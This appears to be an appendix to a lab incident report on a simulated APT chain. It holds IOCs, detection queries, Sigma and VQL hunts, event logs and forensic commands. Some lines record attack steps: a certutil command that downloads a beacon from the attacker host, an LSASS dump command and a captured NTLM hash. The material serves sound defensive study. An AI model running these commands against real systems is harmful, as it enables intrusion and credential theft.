# Appendix – APT Attack Chain Simulation Incident Report

This appendix contains supporting evidence, raw logs, query outputs, tool versions, and supplementary materials referenced in the main incident report.

---

## Appendix A: Indicators of Compromise (Full List)

### A.1 Network IOCs

| Type | Value          | Direction               | Phase   |
| ---- | -------------- | ----------------------- | ------- |
| IPv4 | `192.168.1.5`  | Source / Destination    | All     |
| IPv4 | `192.168.1.20` | Destination             | 2,3,4,5 |
| IPv4 | `192.168.1.10` | Destination             | 6,7     |
| Port | `4444`         | Outbound (WS1 → Kali)   | 2       |
| Port | `8080`         | Inbound (WS1/DC ← Kali) | 2,7     |
| Port | `8081`         | Outbound (DC → Kali)    | 7       |
| Port | `445`          | Inbound (Kali → DC)     | 6       |

### A.2 File System IOCs

| Host | Path               | File Name                             | Size (bytes) |
| ---- | ------------------ | ------------------------------------- | ------------ |
| WS1  | `C:\Users\Public\` | `shell.exe`                           | 7168         |
| DC   | `C:\Users\Public\` | `beacon.exe`                          | 7168         |
| DC   | `C:\Windows\Temp\` | `PSEXESVC.exe`                        | (temporary)  |
| Kali | `/tmp/`            | `shell.exe`, `beacon.exe`, `hash.txt` | –            |

### A.3 Process IOCs

| Process Name   | Parent                       | Host | Command Line                                                                          |
| -------------- | ---------------------------- | ---- | ------------------------------------------------------------------------------------- |
| `shell.exe`    | `cmd.exe` / `powershell.exe` | WS1  | `C:\Users\Public\shell.exe`                                                           |
| `beacon.exe`   | `cmd.exe`                    | DC   | `C:\Users\Public\beacon.exe`                                                          |
| `certutil.exe` | `cmd.exe`                    | DC   | `certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe` |
| `PSEXESVC.exe` | `services.exe`               | DC   | `PSEXESVC.exe -accepteula`                                                            |
| `eventvwr.exe` | `cmd.exe`                    | WS1  | `eventvwr.exe` (UAC bypass)                                                           |

### A.4 Scheduled Task IOC

| Task Name | Host | Action                      | Trigger     |
| --------- | ---- | --------------------------- | ----------- |
| `Updater` | WS1  | `C:\Users\Public\shell.exe` | Daily 09:00 |

### A.5 Credential IOC

| User            | Domain   | NTLM Hash                          |
| --------------- | -------- | ---------------------------------- |
| `Administrator` | `NATION` | `2906d851e56454c1a699b58709c46497` |

---

## Appendix B: Tool Versions

| Tool                               | Version                 | Host                      |
| ---------------------------------- | ----------------------- | ------------------------- |
| Kali Linux                         | 2026.1                  | Kali VM                   |
| Metasploit Framework               | 6.4.x                   | Kali                      |
| Impacket                           | 0.14.0.dev0             | Kali                      |
| msfvenom                           | Bundled with Metasploit | Kali                      |
| Winlogbeat                         | 8.8.0                   | WS1, DC                   |
| Elasticsearch                      | 8.8.0                   | Host PC (`192.168.1.100`) |
| Kibana                             | 8.8.0                   | Host PC                   |
| Sysmon (recommended, not deployed) | 15.14                   | N/A                       |
| Velociraptor                       | 0.7.2                   | Server + Clients          |
| Windows 10 (WS1)                   | 10.0.19045.3803         | WS1                       |
| Windows Server                     | 2019 Datacenter         | DC                        |

---

## Appendix C: Kibana Queries Used

All queries target the `winlogbeat-*` index.

### C.1 Process Creation (Reverse Shell)

```kql
event.code:4688 AND process.name:shell.exe
```

### C.2 Scheduled Task Persistence

```kql
event.code:4698 AND winlog.event_data.TaskName:Updater
```

### C.3 UAC Bypass

```kql
event.code:4688 AND winlog.event_data.ParentProcessName:eventvwr.exe AND winlog.event_data.ProcessName:cmd.exe
```

### C.4 LSASS Access (Credential Dumping)

```kql
event.code:4663 AND winlog.event_data.ObjectName:*lsass.exe AND winlog.event_data.AccessMask:0x1FFFFF
```

### C.5 Lateral Movement (Network Logon)

```kql
event.code:4624 AND winlog.event_data.LogonType:3 AND source.ip:192.168.1.5
```

### C.6 HTTP Beacon

```kql
event.code:3 AND destination.ip:192.168.1.5 AND destination.port:8081
```

### C.7 Certutil Download

```kql
event.code:4688 AND process.name:certutil.exe AND command.line:*-urlcache* AND command.line:*.exe
```

### C.8 Complete Attack Timeline

```kql
host.name:(WS1 OR DC) AND event.code:(4688 OR 4698 OR 4663 OR 4624 OR 4672 OR 5140 OR 7045 OR 3)
```

---

## Appendix D: Sigma Rules Summary

| Rule File                   | Technique(s)         | Severity |
| --------------------------- | -------------------- | -------- |
| `malware-execution.yaml`    | T1204.002, T1059.003 | High     |
| `persistence-task.yaml`     | T1053.005            | Medium   |
| `privilege-escalation.yaml` | T1548.002, T1134.001 | High     |
| `credential-access.yaml`    | T1003.001            | Critical |
| `lateral-movement.yaml`     | T1550.002, T1021.002 | High     |
| `command-control.yaml`      | T1071.001, T1218.008 | High     |

---

## Appendix E: Velociraptor VQL Hunt Queries

### E.1 Process Hunting

```sql
SELECT Name, Pid, Exe, CommandLine, CreateTime, ParentExe, Username
FROM hunt_results()
WHERE Exe =~ '(?i)(shell|beacon)\.exe$'
   OR (
        Exe =~ '(?i)certutil\.exe$'
        AND CommandLine =~ '(?i)-urlcache.*http.*\.exe'
      )
```

### E.2 File System Hunt

```sql
SELECT File.Path, File.Size, File.CreateTime, File.Md5, File.Sha1
FROM hunt_results()
WHERE File.Path =~ '(?i)(C:\\Users\\Public\\shell\.exe|C:\\Users\\Public\\beacon\.exe)'
```

### E.3 Network Connections

```sql
SELECT *
FROM hunt_results(artifact="Windows.EventLogs.Sysmon")
WHERE EventID = 3
  AND EventData.DestinationIp =~ '192\.168\.1\.5'
  AND EventData.DestinationPort IN ('4444', '8081')
```

### E.4 Scheduled Tasks Hunt

```sql
SELECT Name, State, Action, Triggers
FROM hunt_results()
WHERE Name =~ '(?i)^Updater$'
```

---

## Appendix F: Raw Event Log Snippets

### F.1 Event 4688 – `shell.exe` Execution (WS1)

```text
Log Name: Security
Source: Microsoft-Windows-Security-Auditing
Event ID: 4688
Task Category: Process Creation
Computer: WS1.nation.local

Description:
Process Name: C:\Users\Public\shell.exe
Parent Process Name: C:\Windows\System32\cmd.exe
Creator Process ID: 0x4764
Subject: WS1\WS-1
```

### F.2 Event 4624 – Network Logon (DC)

```text
Log Name: Security
Source: Microsoft-Windows-Security-Auditing
Event ID: 4624
Task Category: Logon
Computer: DC.nation.local

Description:
Logon Type: 3 (Network)
Target User: Administrator
Target Domain: NATION
Source Network Address: 192.168.1.5
Authentication Package: NTLM
Workstation: KALI
```

### F.3 Event 7045 – `PSEXESVC` Service Installation

```text
Log Name: System
Source: Service Control Manager
Event ID: 7045

Description:
A service was installed in the system.

Service Name: PSEXESVC
Service File Name: C:\Windows\Temp\PSEXESVC.exe
Service Type: User mode service
Service Start Type: Demand start
```

---

## Appendix G: Screenshot Reference Table

| Screenshot # | File Name               | Description                 |
| ------------ | ----------------------- | --------------------------- |
| 6            | `msfvenom-payload.png`  | Payload generation          |
| 7            | `http-server.png`       | Python HTTP server          |
| 8            | `ws1-download.png`      | Payload download on WS1     |
| 9            | `msf-handler.png`       | Metasploit listener ready   |
| 10           | `session-opened.png`    | Reverse shell established   |
| 11           | `kibana-4688-shell.png` | Event 4688 for `shell.exe`  |
| 12           | `scheduled-task.png`    | Event 4698 (`Updater`)      |
| 13           | `system-privilege.png`  | SYSTEM privileges obtained  |
| 14           | `mimikatz-output.png`   | Credential extraction       |
| 21           | `hash-saved.png`        | NTLM hash saved             |
| 23           | `dc-shell.png`          | Domain Controller shell     |
| 24           | `kibana-4624.png`       | Pass-the-hash logon         |
| 25           | `kibana-4672.png`       | Privileged logon            |
| 26           | `beacon-msfvenom.png`   | Beacon generation           |
| 27           | `certutil-download.png` | `certutil` download         |
| 28           | `beacon-session.png`    | Beacon callback             |
| 29           | `kibana-beacon-net.png` | Sysmon Event 3              |
| 30           | `process-tree.png`      | `certutil.exe → beacon.exe` |
| 31           | `kibana-timeline.png`   | Attack timeline             |
| 32           | `mitre-chart.png`       | ATT&CK coverage             |
| 33           | `parent-child.png`      | Parent-child anomaly        |

---

## Appendix H: File Hashes

| File         | MD5            | SHA1           |
| ------------ | -------------- | -------------- |
| `shell.exe`  | Not calculated | Not calculated |
| `beacon.exe` | Not calculated | Not calculated |

> In a real investigation, compute hashes using `Get-FileHash`, `sha256sum`, or equivalent forensic tooling.

---

## Appendix I: Network Traffic Summary

| Timestamp | Source         | Destination   | Port | Protocol | Indicator         |
| --------- | -------------- | ------------- | ---- | -------- | ----------------- |
| 06:13:49  | `192.168.1.20` | `192.168.1.5` | 4444 | TCP      | Reverse shell     |
| 06:25:09  | `192.168.1.10` | `192.168.1.5` | 8080 | HTTP     | `GET /beacon.exe` |
| 06:25:10+ | `192.168.1.10` | `192.168.1.5` | 8081 | HTTP     | Beacon callbacks  |

---

## Appendix J: Forensic Acquisition Commands

### J.1 Export Windows Event Logs

```cmd
wevtutil epl Security C:\forensics\Security_WS1.evtx
wevtutil epl System C:\forensics\System_DC.evtx
wevtutil epl Microsoft-Windows-PowerShell/Operational C:\forensics\PowerShell.evtx
```

### J.2 Copy Payload Files

```cmd
copy C:\Users\Public\shell.exe C:\forensics\
copy C:\Users\Public\beacon.exe C:\forensics\
```

### J.3 Export Scheduled Task

```cmd
schtasks /query /tn "Updater" /xml > C:\forensics\Updater.xml
```

### J.4 Acquire LSASS Dump (If Authorized)

```cmd
procdump -ma lsass.exe C:\forensics\lsass.dmp
```

### J.5 Archive Kali Artifacts

```bash
tar -czf kali_artefacts.tar.gz ~/.bash_history /tmp/shell.exe /tmp/beacon.exe /tmp/hash.txt
```

---

## Appendix K: MITRE ATT&CK Heatmap Layer (JSON)

```json
{
  "techniques": [
    { "techniqueID": "T1204.002", "score": 90 },
    { "techniqueID": "T1059.003", "score": 85 },
    { "techniqueID": "T1053.005", "score": 80 },
    { "techniqueID": "T1548.002", "score": 95 },
    { "techniqueID": "T1134.001", "score": 70 },
    { "techniqueID": "T1562.001", "score": 100 },
    { "techniqueID": "T1562.004", "score": 95 },
    { "techniqueID": "T1218.008", "score": 90 },
    { "techniqueID": "T1003.001", "score": 100 },
    { "techniqueID": "T1550.002", "score": 100 },
    { "techniqueID": "T1021.002", "score": 95 },
    { "techniqueID": "T1071.001", "score": 90 }
  ]
}
```
